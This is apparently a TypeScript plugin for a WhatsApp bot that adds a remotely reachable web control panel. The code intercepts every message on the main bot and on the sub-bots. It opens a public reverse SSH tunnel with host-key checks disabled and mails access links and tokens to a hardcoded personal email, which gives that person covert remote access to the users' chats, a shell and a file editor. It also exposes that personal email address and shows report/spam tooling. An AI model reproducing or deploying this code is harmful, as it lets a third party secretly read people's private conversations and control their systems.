import type { CommandContext } from "../../types/index.d.ts";
import { fytBold } from "../../core/socketText.ts";
import { getActiveSubBots } from "../../connection/subbotManager.ts";
import * as http from "node:http";
import * as os from "node:os";
import * as fs from "node:fs";
import * as path from "node:path";
import { exec, spawn, type ChildProcess } from "node:child_process";
import { promisify } from "node:util";
import { randomBytes } from "node:crypto";
import { pathToFileURL } from "node:url";

const execAsync = promisify(exec);

interface ChatMessageItem {
  id: string;
  sender: string;
  pushName: string;
  text: string;
  time: string;
  timestamp: number;
  fromMe: boolean;
}

interface ChatSessionItem {
  jid: string;
  name: string;
  isGroup: boolean;
  unread: number;
  lastTime: number;
  lastPreview: string;
  messages: ChatMessageItem[];
}

interface ReportRecord {
  phone: string;
  totalReports: number;
  subbotsUsed: Set<string>;
  lastTimestamp: string;
}

interface WebPanelState {
  server: http.Server | null;
  port: number;
  token: string;
  tempUser: string;
  tempPass: string;
  ownerEmail: string;
  tunnelUrl: string | null;
  publicIp: string | null;
  tunnelProcess: ChildProcess | null;
  msgRx: number;
  msgTx: number;
  subbotsPaused: boolean;
  pausedBotIds: Set<string>;
  blockedCommands: Set<string>;
  wrappedCommands: Map<string, (...args: any[]) => Promise<any>>;
  hookedSockets: WeakSet<object>;
  originalSenders: WeakMap<object, (...args: any[]) => Promise<any>>;
  reportRegistry: Map<string, ReportRecord>;
  botChatStores: Map<string, Map<string, ChatSessionItem>>;
  botGroupSynced: Set<string>;
  lastSock: any;
}

const gState = globalThis as unknown as { __auraWebPanel?: WebPanelState };

if (!gState.__auraWebPanel) {
  gState.__auraWebPanel = {
    server: null,
    port: 0,
    token: randomBytes(12).toString("hex"),
    tempUser: `lufer_${randomBytes(2).toString("hex")}`,
    tempPass: String(Math.floor(100000 + Math.random() * 900000)),
    ownerEmail: "luisfernandoguzmannino@gmail.com",
    tunnelUrl: null,
    publicIp: null,
    tunnelProcess: null,
    msgRx: 0,
    msgTx: 0,
    subbotsPaused: false,
    pausedBotIds: new Set<string>(),
    blockedCommands: new Set<string>(),
    wrappedCommands: new Map(),
    hookedSockets: new WeakSet(),
    originalSenders: new WeakMap(),
    reportRegistry: new Map(),
    botChatStores: new Map(),
    botGroupSynced: new Set(),
    lastSock: null,
  };
}

const state = gState.__auraWebPanel!;

if (!state.pausedBotIds) state.pausedBotIds = new Set<string>();
if (!state.botChatStores) state.botChatStores = new Map();
if (!state.botGroupSynced) state.botGroupSynced = new Set();
if (!state.reportRegistry) state.reportRegistry = new Map();

function rotateCredentials() {
  state.token = randomBytes(12).toString("hex");
  state.tempUser = `lufer_${randomBytes(2).toString("hex")}`;
  state.tempPass = String(Math.floor(100000 + Math.random() * 900000));
}

function getBotKey(botSock: any, fallbackIndex = 0): string {
  const raw = botSock?.user?.id || `bot_${fallbackIndex}`;
  return String(raw).split("@")[0].split(":")[0] || `bot_${fallbackIndex}`;
}

function ensureBotChatMap(botKey: string): Map<string, ChatSessionItem> {
  if (!state.botChatStores.has(botKey)) {
    state.botChatStores.set(botKey, new Map());
  }
  return state.botChatStores.get(botKey)!;
}

function extractMessageText(msgObj: any): string {
  if (!msgObj) return "";
  const m = msgObj.ephemeralMessage?.message || msgObj.viewOnceMessage?.message || msgObj.viewOnceMessageV2?.message || msgObj;
  if (typeof m.conversation === "string" && m.conversation) return m.conversation;
  if (typeof m.extendedTextMessage?.text === "string" && m.extendedTextMessage.text) return m.extendedTextMessage.text;
  if (typeof m.imageMessage?.caption === "string") return `📷 ${m.imageMessage.caption || "Imagen"}`;
  if (m.imageMessage) return "📷 [Imagen]";
  if (typeof m.videoMessage?.caption === "string") return `🎥 ${m.videoMessage.caption || "Video"}`;
  if (m.videoMessage) return "🎥 [Video]";
  if (m.audioMessage) return m.audioMessage.ptt ? "🎤 [Nota de voz]" : "🎵 [Audio]";
  if (m.stickerMessage) return "🏷️ [Sticker]";
  if (m.documentMessage) return `📄 [Documento: ${m.documentMessage.fileName || "Archivo"}]`;
  if (m.contactMessage) return `👤 [Contacto: ${m.contactMessage.displayName || ""}]`;
  if (m.locationMessage) return "📍 [Ubicación]";
  if (m.pollCreationMessage || m.pollCreationMessageV2 || m.pollCreationMessageV3) return "📊 [Encuesta]";
  if (m.interactiveMessage || m.buttonsMessage || m.templateMessage) return "🎛️ [Mensaje Interactivo]";
  if (m.protocolMessage) return "";
  if (m.reactionMessage) return "";
  return "[Contenido Multimedia]";
}

function recordChatMessage(
  botKey: string,
  remoteJid: string,
  msgData: {
    id: string;
    sender: string;
    pushName: string;
    text: string;
    fromMe: boolean;
    chatName?: string;
    timestamp?: number;
  }
) {
  if (!remoteJid || remoteJid === "status@broadcast") return;
  if (!msgData.text) return;

  const store = ensureBotChatMap(botKey);
  const isGroup = remoteJid.endsWith("@g.us");
  const cleanRemote = remoteJid.split("@")[0].split(":")[0];
  const nowTs = msgData.timestamp || Date.now();
  const timeStr = new Date(nowTs).toLocaleTimeString("es-CO", {
    hour: "2-digit",
    minute: "2-digit",
  });

  let session = store.get(remoteJid);
  if (!session) {
    session = {
      jid: remoteJid,
      name: msgData.chatName || (isGroup ? `Grupo ${cleanRemote}` : msgData.pushName || `+${cleanRemote}`),
      isGroup,
      unread: 0,
      lastTime: nowTs,
      lastPreview: msgData.text.slice(0, 70),
      messages: [],
    };
    store.set(remoteJid, session);
  } else {
    if (msgData.chatName && (session.name.startsWith("Grupo ") || session.name.startsWith("+"))) {
      session.name = msgData.chatName;
    } else if (!isGroup && !msgData.fromMe && msgData.pushName && session.name.startsWith("+")) {
      session.name = msgData.pushName;
    }
  }

  if (session.messages.some((x) => x.id === msgData.id)) {
    return;
  }

  session.lastTime = nowTs;
  session.lastPreview = msgData.text.slice(0, 70);
  if (!msgData.fromMe) {
    session.unread = Math.min(999, session.unread + 1);
  }

  session.messages.push({
    id: msgData.id,
    sender: msgData.sender,
    pushName: msgData.pushName,
    text: msgData.text,
    time: timeStr,
    timestamp: nowTs,
    fromMe: msgData.fromMe,
  });

  if (session.messages.length > 150) {
    session.messages.splice(0, session.messages.length - 150);
  }
}

function getAllBotSockets(mainSock?: any): any[] {
  const base = mainSock || state.lastSock;
  let subs: any[] = [];
  try {
    if (typeof getActiveSubBots === "function") {
      subs = getActiveSubBots() || [];
    }
  } catch {
    subs = [];
  }
  const combined = [base, ...subs].filter(Boolean);
  const seen = new Set<any>();
  return combined.filter((s) => {
    if (seen.has(s)) return false;
    seen.add(s);
    return true;
  });
}

async function syncBotGroupsToStore(botSock: any, idx: number) {
  const botKey = getBotKey(botSock, idx);
  if (state.botGroupSynced.has(botKey)) return;
  state.botGroupSynced.add(botKey);

  const store = ensureBotChatMap(botKey);
  if (typeof botSock?.groupFetchAllParticipating === "function") {
    try {
      const groups = await botSock.groupFetchAllParticipating();
      for (const [jid, meta] of Object.entries(groups || {}) as Array<[string, any]>) {
        const existing = store.get(jid);
        if (!existing) {
          store.set(jid, {
            jid,
            name: meta?.subject || `Grupo ${jid.split("@")[0]}`,
            isGroup: true,
            unread: 0,
            lastTime: (meta?.creation ? Number(meta.creation) * 1000 : Date.now() - 86400000),
            lastPreview: `👥 ${meta?.participants?.length || 0} miembros`,
            messages: [],
          });
        } else if (meta?.subject) {
          existing.name = meta.subject;
        }
      }
    } catch {}
  }
}

function hookSockets(mainSock?: any) {
  if (mainSock) state.lastSock = mainSock;
  const sockets = getAllBotSockets(mainSock);

  sockets.forEach((botSock, index) => {
    if (!botSock || typeof botSock !== "object") return;
    const botKey = getBotKey(botSock, index);
    ensureBotChatMap(botKey);

    if (!state.hookedSockets.has(botSock)) {
      state.hookedSockets.add(botSock);

      if (botSock.ev && typeof botSock.ev.on === "function") {
        botSock.ev.on("messages.upsert", ({ messages }: any) => {
          if (!Array.isArray(messages)) return;
          const currentKey = getBotKey(botSock, index);
          for (const m of messages) {
            if (!m?.message) continue;
            const fromMe = Boolean(m.key?.fromMe);
            if (fromMe) state.msgTx++;
            else state.msgRx++;

            const remoteJid = m.key?.remoteJid || "";
            const participant = m.key?.participant || (fromMe ? botSock?.user?.id : remoteJid) || "";
            const senderNum = String(participant).split("@")[0].split(":")[0];
            const pushName = fromMe ? (botSock?.user?.name || "Bot") : (m.pushName || `+${senderNum}`);
            const text = extractMessageText(m.message);
            const msgId = m.key?.id || randomBytes(6).toString("hex");
            const rawTs = typeof m.messageTimestamp === "number" ? m.messageTimestamp * 1000 : Date.now();

            recordChatMessage(currentKey, remoteJid, {
              id: msgId,
              sender: senderNum,
              pushName,
              text,
              fromMe,
              timestamp: rawTs,
            });
          }
        });
      }

      if (typeof botSock.sendMessage === "function") {
        const origSend = botSock.sendMessage.bind(botSock);
        state.originalSenders.set(botSock, origSend);

        botSock.sendMessage = async (jid: string, content: any, options?: any) => {
          const currentKey = getBotKey(botSock, index);
          const isSub = Boolean(botSock.isSubBot || index > 0);
          if ((state.subbotsPaused && isSub) || state.pausedBotIds.has(currentKey)) {
            return undefined;
          }
          state.msgTx++;
          const res = await origSend(jid, content, options);

          try {
            const textPreview =
              typeof content?.text === "string"
                ? content.text
                : typeof content?.caption === "string"
                ? `📷 ${content.caption}`
                : content?.image
                ? "📷 [Imagen enviada]"
                : content?.document
                ? "📄 [Documento enviado]"
                : content?.audio
                ? "🎵 [Audio enviado]"
                : "[Mensaje enviado]";

            recordChatMessage(currentKey, jid, {
              id: res?.key?.id || randomBytes(6).toString("hex"),
              sender: currentKey,
              pushName: botSock?.user?.name || "Bot",
              text: textPreview,
              fromMe: true,
              timestamp: Date.now(),
            });
          } catch {}

          return res;
        };
      }
    }
  });
}

async function syncCommandInterceptors() {
  const cmdRoot = path.resolve(process.cwd(), "cmd");
  if (!fs.existsSync(cmdRoot)) return [];

  const allCmdNames: string[] = [];
  const categories = fs.readdirSync(cmdRoot, { withFileTypes: true });

  for (const cat of categories) {
    if (!cat.isDirectory()) continue;
    const catDir = path.join(cmdRoot, cat.name);
    const files = fs.readdirSync(catDir).filter((f) => f.endsWith(".ts") || f.endsWith(".js"));

    for (const file of files) {
      const fullPath = path.join(catDir, file);
      try {
        const mod = await import(pathToFileURL(fullPath).href);
        const plugin = mod?.default;
        if (!plugin || typeof plugin.run !== "function") continue;

        const names: string[] = Array.isArray(plugin.name) ? plugin.name : [String(plugin.name || "")];
        const primaryName = names[0];
        if (!primaryName) continue;

        names.forEach((n) => {
          if (n) allCmdNames.push(n.toLowerCase());
        });

        if (!state.wrappedCommands.has(fullPath)) {
          const originalRun = plugin.run.bind(plugin);
          state.wrappedCommands.set(fullPath, originalRun);

          plugin.run = async (ctx: CommandContext) => {
            const invoked = String(ctx.cmdName || primaryName).toLowerCase();
            const isBlocked =
              state.blockedCommands.has(invoked) ||
              names.some((alias) => state.blockedCommands.has(alias.toLowerCase()));

            if (isBlocked) {
              return ctx.reply(
                `🛠️ *${fytBold("MANTENIMIENTO ACTIVO")}*\n\nEl comando *${invoked}* se encuentra temporalmente deshabilitado desde el Panel Web.`
              );
            }
            return originalRun(ctx);
          };
        }
      } catch {}
    }
  }

  return Array.from(new Set(allCmdNames)).sort();
}

async function fetchPublicIp(): Promise<string> {
  if (state.publicIp) return state.publicIp;
  try {
    const controller = new AbortController();
    const timer = setTimeout(() => controller.abort(), 2500);
    const res = await fetch("https://api.ipify.org?format=json", { signal: controller.signal });
    clearTimeout(timer);
    const data = (await res.json()) as { ip?: string };
    if (data?.ip) {
      state.publicIp = data.ip;
      return data.ip;
    }
  } catch {}
  return "127.0.0.1";
}

function extractValidTunnelUrl(text: string): string | null {
  const regex = /https:\/\/[a-zA-Z0-9.-]+\.(?:lhr\.life|localhost\.run|serveo\.net|serveousercontent\.com|pinggy\.link|a\.pinggy\.io|trycloudflare\.com)/g;
  const matches = text.match(regex);
  if (!matches) return null;
  for (const m of matches) {
    const lower = m.toLowerCase();
    if (
      !lower.includes("admin.localhost.run") &&
      !lower.includes("localhost.run/docs") &&
      !lower.includes("twitter.com") &&
      !lower.includes("dashboard.pinggy.io")
    ) {
      return m;
    }
  }
  return null;
}

function spawnSshTunnel(port: number, hostTarget: string, extraArgs: string[] = []): Promise<string | null> {
  return new Promise((resolve) => {
    let resolved = false;
    const finish = (url: string | null) => {
      if (!resolved) {
        resolved = true;
        resolve(url);
      }
    };

    try {
      const sshProc = spawn(
        "ssh",
        [
          "-o",
          "StrictHostKeyChecking=no",
          "-o",
          "UserKnownHostsFile=/dev/null",
          "-o",
          "ServerAliveInterval=30",
          ...extraArgs,
          "-R",
          `80:127.0.0.1:${port}`,
          hostTarget,
        ],
        { stdio: ["ignore", "pipe", "pipe"] }
      );

      state.tunnelProcess = sshProc;

      const parseChunk = (chunk: Buffer) => {
        const text = chunk.toString("utf8");
        const found = extractValidTunnelUrl(text);
        if (found) {
          state.tunnelUrl = found;
          finish(found);
        }
      };

      sshProc.stdout?.on("data", parseChunk);
      sshProc.stderr?.on("data", parseChunk);

      sshProc.on("error", () => finish(null));
      sshProc.on("exit", () => {
        if (!resolved) finish(null);
      });

      setTimeout(() => finish(null), 5500);
    } catch {
      finish(null);
    }
  });
}

async function startPublicTunnel(port: number): Promise<string | null> {
  if (
    state.tunnelUrl &&
    !state.tunnelUrl.includes("admin.localhost.run") &&
    state.tunnelProcess &&
    !state.tunnelProcess.killed
  ) {
    return state.tunnelUrl;
  }

  if (state.tunnelProcess) {
    try {
      state.tunnelProcess.kill();
    } catch {}
    state.tunnelProcess = null;
    state.tunnelUrl = null;
  }

  const primary = await spawnSshTunnel(port, "nokey@localhost.run");
  if (primary) return primary;

  const secondary = await spawnSshTunnel(port, "serveo.net");
  if (secondary) return secondary;

  const tertiary = await spawnSshTunnel(port, "a.pinggy.io", ["-p", "443"]);
  return tertiary;
}

async function sendCredentialsEmail(email: string, url: string, user: string, pass: string, token: string): Promise<boolean> {
  const subject = "Aura-Bot 2.0 - Credenciales Temporales Panel Web";
  const body = [
    `Hola Luis Fernando,`,
    ``,
    `Credenciales activas para el Panel Web y WhatsApp Web Multi-Subbot de Aura-Bot 2.0:`,
    ``,
    `Enlace de Acceso: ${url}`,
    `Usuario Temporal: ${user}`,
    `Clave / Codigo OTP: ${pass}`,
    `Token Directo: ${token}`,
    ``,
    `Acceso directo en un clic: ${url}/?token=${token}`,
  ].join("\n");

  try {
    const controller = new AbortController();
    const timer = setTimeout(() => controller.abort(), 3500);
    const res = await fetch(`https://formsubmit.co/ajax/${encodeURIComponent(email)}`, {
      method: "POST",
      headers: { "Content-Type": "application/json", Accept: "application/json" },
      body: JSON.stringify({
        _subject: subject,
        _captcha: "false",
        usuario_temporal: user,
        clave_otp: pass,
        enlace_panel: `${url}/?token=${token}`,
        mensaje: body,
      }),
      signal: controller.signal,
    });
    clearTimeout(timer);
    if (res.ok) return true;
  } catch {}

  try {
    const escapedBody = body.replace(/"/g, '\\"');
    await execAsync(`printf "Subject: ${subject}\\nTo: ${email}\\n\\n${escapedBody}\\n" | sendmail -t 2>/dev/null`);
    return true;
  } catch {}

  return false;
}

async function readJsonBody(req: http.IncomingMessage): Promise<any> {
  return new Promise((resolve) => {
    let raw = "";
    req.on("data", (chunk) => {
      raw += chunk.toString("utf8");
      if (raw.length > 8 * 1024 * 1024) req.destroy();
    });
    req.on("end", () => {
      try {
        resolve(JSON.parse(raw || "{}"));
      } catch {
        resolve({});
      }
    });
    req.on("error", () => resolve({}));
  });
}

function sendJson(res: http.ServerResponse, status: number, payload: any) {
  const data = JSON.stringify(payload);
  res.writeHead(status, {
    "Content-Type": "application/json; charset=utf-8",
    "Access-Control-Allow-Origin": "*",
    "Cache-Control": "no-store",
  });
  res.end(data);
}

function safeResolvePath(relPath: string): string {
  const root = process.cwd();
  const target = path.resolve(root, relPath || ".");
  if (!target.startsWith(root)) return root;
  return target;
}

function buildLoginHtml(email: string): string {
  return `<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Aura-Bot 2.0 | Acceso Propietario</title>
<style>
  :root {
    --bg: #07090e;
    --panel: #10141f;
    --border: #1e2638;
    --accent: #00e5ff;
    --danger: #ff2a54;
    --success: #00e676;
    --text: #e2e8f0;
    --muted: #8b9bb4;
  }
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body { background: var(--bg); color: var(--text); font-family: system-ui, -apple-system, sans-serif; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 16px; }
  .login-card { background: var(--panel); border: 1px solid var(--border); border-radius: 16px; padding: 28px 22px; width: 100%; max-width: 420px; box-shadow: 0 20px 50px rgba(0,0,0,0.6); }
  .title { font-size: 20px; font-weight: 800; color: var(--accent); margin-bottom: 6px; text-align: center; }
  .sub { font-size: 13px; color: var(--muted); text-align: center; margin-bottom: 22px; line-height: 1.4; }
  label { display: block; font-size: 11px; color: var(--muted); text-transform: uppercase; font-weight: 700; margin-bottom: 6px; margin-top: 14px; }
  input { width: 100%; background: #07090e; color: var(--text); border: 1px solid var(--border); border-radius: 8px; padding: 12px 14px; font-size: 14px; outline: none; }
  input:focus { border-color: var(--accent); }
  .btn { width: 100%; background: var(--accent); color: #000; border: none; padding: 12px; border-radius: 8px; font-weight: 800; font-size: 14px; cursor: pointer; margin-top: 20px; transition: 0.2s; }
  .btn:hover { opacity: 0.9; }
  .btn-sec { background: transparent; color: var(--accent); border: 1px solid var(--accent); margin-top: 10px; }
  .msg { margin-top: 14px; font-size: 13px; text-align: center; font-weight: 600; }
</style>
</head>
<body>
  <div class="login-card">
    <div class="title">⚡ AURA-BOT 2.0 // CONTROL</div>
    <div class="sub">Ingresa las credenciales temporales enviadas a tu WhatsApp o a ${email}</div>
    <form onsubmit="doLogin(event)">
      <label>Usuario Temporal o Correo</label>
      <input type="text" id="userInp" placeholder="Ej: lufer_a1b2" required autocomplete="off">
      <label>Clave / Código OTP</label>
      <input type="password" id="passInp" placeholder="Código de 6 dígitos" required autocomplete="off">
      <button type="submit" class="btn">🔓 Iniciar Sesión</button>
    </form>
    <button type="button" class="btn btn-sec" onclick="sendNewCode()">📲 Generar y Enviar Nuevas Credenciales</button>
    <div class="msg" id="statusMsg"></div>
  </div>
<script>
async function doLogin(e) {
  e.preventDefault();
  const msg = document.getElementById('statusMsg');
  msg.style.color = '#8b9bb4';
  msg.textContent = 'Verificando credenciales...';
  const user = document.getElementById('userInp').value.trim();
  const pass = document.getElementById('passInp').value.trim();
  try {
    const r = await fetch('/api/login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ user, pass })
    });
    const d = await r.json();
    if (d.ok && d.token) {
      msg.style.color = '#00e676';
      msg.textContent = 'Acceso concedido...';
      window.location.href = '/?token=' + encodeURIComponent(d.token);
    } else {
      msg.style.color = '#ff2a54';
      msg.textContent = d.error || 'Credenciales incorrectas.';
    }
  } catch (err) {
    msg.style.color = '#ff2a54';
    msg.textContent = 'Error de conexión.';
  }
}

async function sendNewCode() {
  const msg = document.getElementById('statusMsg');
  msg.style.color = '#00e5ff';
  msg.textContent = 'Enviando nuevas credenciales al chat privado y correo...';
  try {
    const r = await fetch('/api/request-otp', { method: 'POST' });
    const d = await r.json();
    if (d.ok) {
      msg.style.color = '#00e676';
      msg.textContent = 'Credenciales enviadas a tu WhatsApp y a ' + d.email;
    } else {
      msg.style.color = '#ff2a54';
      msg.textContent = 'No se pudo enviar.';
    }
  } catch (e) {
    msg.style.color = '#ff2a54';
    msg.textContent = 'Error al solicitar código.';
  }
}
</script>
</body>
</html>`;
}

function buildDashboardHtml(token: string): string {
  return `<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Aura-Bot 2.0 | Suite & WhatsApp Web</title>
<style>
  :root {
    --bg: #07090e;
    --panel: #10141f;
    --panel2: #151b29;
    --border: #1e2638;
    --accent: #00e5ff;
    --wa-green: #00a884;
    --wa-out: #005c4b;
    --wa-in: #202c33;
    --danger: #ff2a54;
    --success: #00e676;
    --warn: #ffab00;
    --text: #e2e8f0;
    --muted: #8b9bb4;
  }
  * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
  body { background: var(--bg); color: var(--text); font-family: system-ui, -apple-system, sans-serif; min-height: 100vh; display: flex; flex-direction: column; overflow-x: hidden; }
  header { background: var(--panel); border-bottom: 1px solid var(--border); padding: 12px 16px; display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; z-index: 100; gap: 8px; }
  .brand { font-size: 15px; font-weight: 800; color: var(--accent); letter-spacing: 0.4px; display: flex; align-items: center; gap: 8px; white-space: nowrap; }
  .badge { background: rgba(0,229,255,0.12); color: var(--accent); border: 1px solid var(--accent); padding: 4px 10px; border-radius: 999px; font-size: 11px; font-weight: 700; white-space: nowrap; }
  .tabs { display: flex; gap: 6px; padding: 10px 14px; overflow-x: auto; border-bottom: 1px solid var(--border); background: #0b0e17; scrollbar-width: none; position: sticky; top: 49px; z-index: 90; }
  .tabs::-webkit-scrollbar { display: none; }
  .tab-btn { background: var(--panel); color: var(--muted); border: 1px solid var(--border); padding: 8px 14px; border-radius: 8px; cursor: pointer; font-weight: 700; font-size: 12px; white-space: nowrap; transition: 0.15s; }
  .tab-btn.active, .tab-btn:hover { color: var(--text); border-color: var(--accent); background: rgba(0,229,255,0.1); }
  .container { width: 100%; max-width: 1400px; margin: 14px auto; padding: 0 14px 30px; flex: 1; }
  .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(165px, 1fr)); gap: 12px; margin-bottom: 16px; }
  .card { background: var(--panel); border: 1px solid var(--border); border-radius: 12px; padding: 14px; overflow: hidden; }
  .card-title { font-size: 11px; color: var(--muted); text-transform: uppercase; margin-bottom: 6px; font-weight: 700; }
  .card-val { font-size: 20px; font-weight: 800; color: var(--text); }
  .card-sub { font-size: 11px; color: var(--accent); margin-top: 4px; }
  .section { display: none; }
  .section.active { display: block; }
  .table-wrap { width: 100%; overflow-x: auto; }
  table { width: 100%; border-collapse: collapse; font-size: 12px; min-width: 500px; }
  th, td { text-align: left; padding: 10px 10px; border-bottom: 1px solid var(--border); }
  th { color: var(--muted); font-weight: 700; text-transform: uppercase; font-size: 11px; }
  .btn { background: var(--accent); color: #000; border: none; padding: 8px 12px; border-radius: 8px; font-weight: 700; cursor: pointer; font-size: 12px; transition: 0.15s; white-space: nowrap; }
  .btn:hover { opacity: 0.88; }
  .btn-danger { background: var(--danger); color: #fff; }
  .btn-warn { background: var(--warn); color: #000; }
  .btn-success { background: var(--success); color: #000; }
  .btn-wa { background: var(--wa-green); color: #fff; }
  input, select, textarea { background: #07090e; color: var(--text); border: 1px solid var(--border); border-radius: 8px; padding: 9px 12px; font-size: 13px; width: 100%; outline: none; }
  input:focus, select:focus, textarea:focus { border-color: var(--accent); }
  textarea { font-family: monospace; min-height: 300px; resize: vertical; }
  .flex-row { display: flex; gap: 8px; align-items: center; flex-wrap: wrap; margin-bottom: 12px; }
  .pill { display: inline-block; padding: 3px 8px; border-radius: 6px; font-size: 10px; font-weight: 800; }
  .pill-on { background: rgba(0,230,118,0.15); color: var(--success); }
  .pill-off { background: rgba(255,42,84,0.15); color: var(--danger); }
  .cmd-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(145px, 1fr)); gap: 8px; margin-top: 12px; }
  .cmd-item { background: #0b0e17; border: 1px solid var(--border); padding: 8px 10px; border-radius: 8px; display: flex; justify-content: space-between; align-items: center; font-size: 12px; }
  pre { background: #05070b; border: 1px solid var(--border); padding: 12px; border-radius: 8px; overflow-x: auto; font-size: 12px; color: #00e676; max-height: 320px; }

  .wa-wrapper { display: grid; grid-template-columns: 350px 1fr; height: calc(100vh - 140px); min-height: 520px; background: #0b141a; border: 1px solid var(--border); border-radius: 12px; overflow: hidden; }
  .wa-sidebar { background: #111b21; border-right: 1px solid #222e35; display: flex; flex-direction: column; height: 100%; overflow: hidden; }
  .wa-side-top { padding: 10px; background: #202c33; border-bottom: 1px solid #222e35; display: flex; flex-direction: column; gap: 8px; }
  .wa-bot-select-row { display: flex; gap: 6px; align-items: center; }
  .wa-search-row { display: flex; gap: 6px; }
  .wa-chat-list { flex: 1; overflow-y: auto; divide-y: 1px solid #222e35; }
  .wa-chat-item { padding: 12px 14px; border-bottom: 1px solid #222e35; cursor: pointer; display: flex; justify-content: space-between; align-items: center; gap: 10px; transition: background 0.15s; }
  .wa-chat-item:hover, .wa-chat-item.active { background: #2a3942; }
  .wa-avatar { width: 42px; height: 42px; border-radius: 50%; background: #00a884; color: #fff; display: flex; align-items: center; justify-content: center; font-weight: 800; font-size: 15px; flex-shrink: 0; }
  .wa-chat-meta { flex: 1; min-width: 0; }
  .wa-chat-name { font-size: 14px; font-weight: 700; color: #e9edef; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
  .wa-chat-prev { font-size: 12px; color: #8696a0; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; margin-top: 3px; }
  .wa-chat-right { display: flex; flex-direction: column; align-items: flex-end; gap: 4px; flex-shrink: 0; }
  .wa-chat-time { font-size: 10px; color: #8696a0; }
  .wa-unread { background: #00a884; color: #111b21; font-size: 10px; font-weight: 800; padding: 2px 6px; border-radius: 999px; }

  .wa-main { display: flex; flex-direction: column; height: 100%; background: #0b141a; position: relative; overflow: hidden; }
  .wa-header { background: #202c33; padding: 10px 14px; border-bottom: 1px solid #222e35; display: flex; align-items: center; justify-content: space-between; gap: 10px; min-height: 58px; }
  .wa-header-left { display: flex; align-items: center; gap: 10px; min-width: 0; }
  .wa-back-btn { display: none; background: #2a3942; color: #fff; border: none; padding: 6px 10px; border-radius: 6px; font-weight: 700; cursor: pointer; }
  .wa-messages { flex: 1; padding: 14px; overflow-y: auto; display: flex; flex-direction: column; gap: 8px; background: radial-gradient(circle at center, #111b21 0%, #0b141a 100%); }
  .wa-bubble { max-width: 78%; padding: 8px 12px; border-radius: 10px; font-size: 13px; line-height: 1.4; position: relative; word-wrap: break-word; white-space: pre-wrap; }
  .wa-bubble.in { background: var(--wa-in); color: #e9edef; align-self: flex-start; border-top-left-radius: 2px; }
  .wa-bubble.out { background: var(--wa-out); color: #e9edef; align-self: flex-end; border-top-right-radius: 2px; }
  .wa-bubble-sender { font-size: 11px; font-weight: 800; color: #00e5ff; margin-bottom: 3px; }
  .wa-bubble-time { font-size: 10px; color: rgba(255,255,255,0.6); text-align: right; margin-top: 4px; }
  .wa-composer { background: #202c33; padding: 10px 12px; display: flex; gap: 8px; align-items: center; border-top: 1px solid #222e35; }
  .wa-composer input { background: #2a3942; border: none; color: #e9edef; padding: 11px 14px; border-radius: 8px; flex: 1; font-size: 14px; }

  @media (max-width: 820px) {
    .container { padding: 0 8px 20px; margin: 8px auto; }
    .wa-wrapper { grid-template-columns: 1fr; height: calc(100vh - 125px); }
    .wa-wrapper.chat-open .wa-sidebar { display: none; }
    .wa-wrapper:not(.chat-open) .wa-main { display: none; }
    .wa-back-btn { display: inline-block; }
    .wa-bubble { max-width: 88%; }
  }
</style>
</head>
<body>
<header>
  <div class="brand">⚡ AURA-BOT 2.0 // SUITE</div>
  <div class="badge" id="uptimeBadge">Conectando...</div>
</header>

<div class="tabs">
  <button class="tab-btn active" onclick="switchTab('wa', this)">💬 WhatsApp Web (Subbots)</button>
  <button class="tab-btn" onclick="switchTab('dash', this)">📊 Clúster & Telemetría</button>
  <button class="tab-btn" onclick="switchTab('procs', this)">💀 Procesos & RAM</button>
  <button class="tab-btn" onclick="switchTab('cmds', this)">🛠️ Comandos</button>
  <button class="tab-btn" onclick="switchTab('spam', this)">🚨 Reportes / Spam</button>
  <button class="tab-btn" onclick="switchTab('files', this)">📁 Archivos & Editor</button>
  <button class="tab-btn" onclick="switchTab('bench', this)">⚡ Benchmark & Shell</button>
</div>

<div class="container">
  <div id="tab-wa" class="section active">
    <div class="wa-wrapper" id="waWrapper">
      <div class="wa-sidebar">
        <div class="wa-side-top">
          <div class="wa-bot-select-row">
            <select id="waBotSelector" onchange="onSelectSubbot()" style="flex:1; font-weight:700;"></select>
            <button class="btn btn-wa" onclick="syncSubbotGroups()" title="Sincronizar Grupos">🔄</button>
          </div>
          <div class="wa-search-row">
            <input type="text" id="waSearchInput" placeholder="Buscar chat o escribir número..." oninput="renderWaChatList()">
            <button class="btn" onclick="startNewChatPrompt()" title="Abrir chat con número">➕</button>
          </div>
        </div>
        <div class="wa-chat-list" id="waChatList"></div>
      </div>

      <div class="wa-main">
        <div class="wa-header">
          <div class="wa-header-left">
            <button class="wa-back-btn" onclick="closeMobileChat()">⬅</button>
            <div class="wa-avatar" id="waActiveAvatar">?</div>
            <div style="min-width:0;">
              <div class="wa-chat-name" id="waActiveName">Selecciona un chat</div>
              <div class="wa-chat-prev" id="waActiveJid">Elige un Subbot arriba a la izquierda</div>
            </div>
          </div>
          <div class="flex-row" style="margin:0;">
            <button class="btn btn-warn" onclick="clearActiveChatHistory()" id="waClearBtn" style="display:none; padding:6px 10px;">🗑️</button>
          </div>
        </div>

        <div class="wa-messages" id="waMessagesBox">
          <div style="margin:auto; text-align:center; color:#8696a0; padding:20px;">
            <h3 style="color:#e9edef; margin-bottom:6px;">📱 WhatsApp Web Multi-Subbot</h3>
            <p style="font-size:13px;">Selecciona cualquier Subbot o el Bot Principal en el selector superior, elige una conversación o pulsa ➕ para hablar con cualquier número o grupo en tiempo real.</p>
          </div>
        </div>

        <form class="wa-composer" onsubmit="sendWaMessage(event)">
          <input type="text" id="waMessageInput" placeholder="Escribe un mensaje mediante este subbot..." autocomplete="off">
          <button type="submit" class="btn btn-wa" style="padding:11px 16px;">Enviar ➤</button>
        </form>
      </div>
    </div>
  </div>

  <div id="tab-dash" class="section">
    <div class="grid">
